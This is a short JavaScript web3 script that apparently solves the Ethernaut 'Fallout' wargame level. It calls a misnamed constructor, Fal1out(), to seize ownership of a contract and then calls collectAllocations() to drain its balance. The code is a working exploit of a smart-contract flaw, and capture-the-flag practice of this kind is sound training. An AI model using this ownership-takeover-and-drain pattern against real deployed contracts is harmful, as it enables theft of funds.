const { Web3 } = require('web3');
require('dotenv').config();

const web3 = new Web3(process.env.web3Provider);
const account = web3.eth.accounts.wallet.add(process.env.privateKey);


const contract_abi = require('./abi_json/2-Fallout.json');
const contract_address = '0xa0b7fbc05854539D4B0330a6d69871b6333e056e';
const contract = new web3.eth.Contract(contract_abi, contract_address);


async function solve() {
  var res;

  res = await contract.methods.owner().call();
  console.log(res);

  res = await contract.methods.Fal1out().send({
    from: account[0].address, 
    value: 1
  });
  console.log(res);

  res = await contract.methods.owner().call();
  console.log(res);

  res = await web3.eth.getBalance(contract_address);
  console.log(res);

  res = await contract.methods.collectAllocations().send({
    from: account[0].address
  });
  console.log(res);

  res = await web3.eth.getBalance(contract_address);
  console.log(res);
}

solve();